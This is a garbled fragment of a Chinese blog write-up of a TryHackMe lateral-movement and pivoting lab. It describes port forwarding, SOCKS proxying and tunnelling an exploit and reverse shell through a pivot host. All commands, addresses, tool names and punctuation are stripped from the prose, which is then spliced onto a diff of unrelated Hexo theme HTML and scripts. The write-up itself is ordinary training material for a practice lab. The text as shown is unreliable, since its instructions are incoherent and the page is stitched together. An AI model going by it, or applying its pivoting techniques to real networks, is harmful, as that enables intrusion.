要稍微调整一下命令结果将生成端口并侦听要转发到攻击者计算机上的端口的连接动态端口转发和虽然单端口转发对于需要访问特定套接字的任务非常有效但有时我们可能需要通过枢轴主机对主机的许多端口甚至跨多台计算机的许多端口运行扫描在这些情况下动态端口转发允许我们通过主机进行旋转并使用代理与我们想要的任何地址端口建立多个连接由于我们不想依赖目标网络中计算机上现有的服务器因此我们通常会使用客户端通过以下命令建立反向动态端口转发在这种情况下服务器将在端口上启动代理并通过隧道转发任何连接请求最终由客户端代理最有趣的部分是我们可以使用代理链通过代理轻松使用我们的任何工具为此我们首先需要确保正确配置为将任何连接指向代理服务器的使用的同一端口配置文件可以在上的处找到如果我们向下滚动到配置文件的末尾我们应该看到一行指示用于袜子代理的端口默认端口是但是只要与我们建立隧道时使用的端口匹配任何端口都可以工作如果我们现在想通过代理执行任何命令我们可以使用代理链请注意某些软件例如在某些情况下可能无法与很好地配合并且可能显示不同的结果因此您的情况可能会有所不同实践练习注意由于您将使用执行从实验室网络到攻击者计算机的连接因此我们强烈建议您使用或虚拟机而不是您的实际计算机已给出有关创建不允许通过运行命令或传输文件的用户的说明因此请务必按照提供的说明进行操作还建议为创建一个强密码并确保它是唯一且可丢弃的密码而不是您在此或任何其他平台中的实际密码要完成此练习您需要使用在任务中从分配给您的凭据连接到如果您还没有这样做请单击链接并立即获取凭据获得凭据后通过连接到密码为我们的第一个目标是通过连接到如果我们尝试直接从攻击者计算机进行连接我们会发现端口已通过防火墙过滤因此无法直接使用但是该端口已启动并正在运行但只能从访问通过使用上上提供的我们将转发端口使其在上可用于从攻击者的计算机进行连接为此我们将使用以下参数运行请注意我们不能将端口用于侦听器因为它已在中用于其自己的服务请随意将侦听器端口更改为其他号码以避免与其他学生发生冲突在典型设置中您必须添加防火墙规则以允许流量通过侦听器端口但为了方便起见已禁用其防火墙设置侦听器后您应该能够通过处的侦听器通过从攻击者计算机连接到连接后您应该会从上的桌面上获得一个标志隧道复杂漏洞服务器正在运行的易受攻击版本我们面临的问题是防火墙规则限制对易受攻击的端口的访问因此只能从进行查看此外来自的出站连接仅允许其本地网络中的计算机进行因此无法直接接收到攻击者计算机的反向更糟糕的是漏洞要求攻击者托管服务器来触发最终有效负载但由于攻击者的计算机不允许出站连接因此我们需要找到一种方法来托管服务器之一同一网络中的其他机器这一点也不方便我们可以使用端口转发来克服所有这些问题首先让我们看看该漏洞利用程序是如何工作的首先它将连接到端口中的以触发第二个连接第二个连接将在上针对攻击者的计算机进行其中服务器将传递最终的有效负载最后攻击者的有效负载将在上执行并向攻击者发送回反向考虑到这一点我们可以使用将某些端口从攻击者的计算机转发到用于服务器的和用于接收反向的并通过到达上的我们需要在两个方向上进行三个端口转发以便所有漏洞利用的交互都可以通过进行代理将侦听上的端口因此我们需要使用远程端口转发通过将该端口隧道传回攻击者的计算机由于攻击盒的端口已被其他服务占用因此我们需要将上的端口与攻击盒当前未使用的某个端口链接起来让我们使用端口在中运行来转发此端口时我们必须将添加到我们的命令中对于和我们随意选择两个随机端口出于演示目的我们将设置和但请务必使用不同的端口因为实验室与其他学生共享因此如果你们两个选择相同的端口当尝试转发它们时您会收到一条错误消息指出此类端口已在上使用要将此类端口从攻击者计算机转发到我们将通过在命令中添加和来使用本地端口转发这将绑定上的两个端口并将任何连接隧道返回到我们的攻击者计算机将整个命令放在一起我们最终会得到以下结果注意如果您使用并且之前加入过其他网络房间请务必选择分配给面向网络的隧道接口的地址作为您的否则您的反向连接将获胜无法正常工作为了您的方便连接到该网络的接口称为因此您应该能够通过运行获得正确的地址一旦所有端口转发到位我们就可以启动并配置漏洞利用程序以便所需的端口与我们通过转发的端口相匹配这里有很多东西需要解压参数通常有两个用途作为攻击者机器上绑定监听器的用于接收反向它还嵌入在有效负载中以便受害者知道在触发漏洞时从哪里进行连接在我们的特定场景中由于无法联系到我们因此我们需要强制有效负载连接回但我们需要侦听器在上绑定到攻击者的计算机为此提供了一个可选参数该参数可用于指定攻击者机器上侦听器的绑定地址与负载将连接回的地址分开在我们的示例中我们希望将反向侦听器绑定到攻击者计算机上的并将有效负载连接回因为它将通过隧道转发到攻击者计算机我们的漏洞还必须运行一个服务器来托管并将最终有效负载发送回受害者服务器我们使用来指示监听地址在本例中为以便攻击者机器将服务器绑定到虽然这可能违反直觉因为没有外部主机能够指向攻击者的计算机本地主机但隧道将负责将处上收到的任何连接转发回攻击者的计算机设置为指向因为隧道将通过使用建立的隧道将请求转发到设置为因为发送到攻击者计算机上该端口的任何连接都将转发到上的端口启动该漏洞后您将在攻击者的计算机上收到一个您会在上找到一个标志参考文章',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-02-17 14:56:57',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-<!DOCTYPE html><html lang="zh-CN">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
-  
-  <meta name="generator" content="Hexo 7.2.0">
-  <meta http-equiv='x-dns-prefetch-control' content='on' />
-  
-  <meta name="renderer" content="webkit">
-  <meta name="force-rendering" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-  <meta name="HandheldFriendly" content="True" >
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
-  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
-  
-  <title>THM-Lateral Movement and Pivoting - hybcx's blog</title>
-
-  
-    <meta name="description" content="0x01 简介 在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具. 建议在此之前先浏览一下入侵 AD 和枚举 AD 房间。 学习目标  熟悉攻击者使用的横向移动技术。 了解如何使用替代认证材料进行横向移动。 了解使用受感染主机作为枢纽的不同方法。  索取您的凭证 为了模拟 AD 违规，您将获得第一组 A">
-<meta property="og:type" content="article">
-<meta property="og:title" content="THM-Lateral Movement and Pivoting">
-<meta property="og:url" content="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/index.html">
-<meta property="og:site_name" content="hybcx&#39;s blog">
-<meta property="og:description" content="0x01 简介 在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具. 建议在此之前先浏览一下入侵 AD 和枚举 AD 房间。 学习目标  熟悉攻击者使用的横向移动技术。 了解如何使用替代认证材料进行横向移动。 了解使用受感染主机作为枢纽的不同方法。  索取您的凭证 为了模拟 AD 违规，您将获得第一组 A">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115235787.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115300957.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115647139.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120249867.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120302427.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121358957.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121628886.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216122007744.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123451462.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123458246.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216140108272.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216145026235.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150118868.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150256426.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150326439.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162531192.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162901279.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163656590.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163752957.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163905893.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216164334193.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165339194.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165820771.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202509233.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202415931.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203013265.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203227640.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204345929.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204530374.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204552262.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205715457.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205818932.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205806238.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205954150.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210148593.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210318888.png">
-<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/3a9b9b89b41c2382a2c8645ab1c01a2f0e640df2/images/image-20240217120311538.png">
-<meta property="article:published_time" content="2024-02-16T03:26:40.901Z">
-<meta property="article:modified_time" content="2024-02-17T06:56:57.510Z">
-<meta property="article:author" content="hybcx">
-<meta property="article:tag" content="TryHackMe">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115235787.png">
-  
-  
-  
-  <meta name="keywords" content="TryHackMe">
-
-  <!-- feed -->
-  
-    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
-  
-
-  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
-
-  
-    <link rel="shortcut icon" href="/medias/logo.png">
-  
-
-  
-    
-<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
-
-  
-
-  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">
-
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
-<body>
-
-<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
-
-
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>
-
-<div class="nav-area">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
-
-
-<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
-</div>
-<div class="widgets">
-
-
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
-</div>
-<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
-</div></aside><div class="l_main" id="main">
-
-
-
-
-
-<div class="article banner top">
-  <div class="content">
-    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/TryHackMe/">TryHackMe</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-02-16T03:26:40.901Z">2024-02-16</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-02-17T06:56:57.510Z">2024-02-17</time></span></div></div></div>
-    
-    <div class="bottom only-title">
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-      <div class="text-area">
-        <h1 class="text title"><span>THM-Lateral Movement and Pivoting</span></h1>
-        
-      </div>
-    </div>
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-  </div>
-  </div><article class="md-text content"><h1 id="0x01-简介">0x01 简介</h1>
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
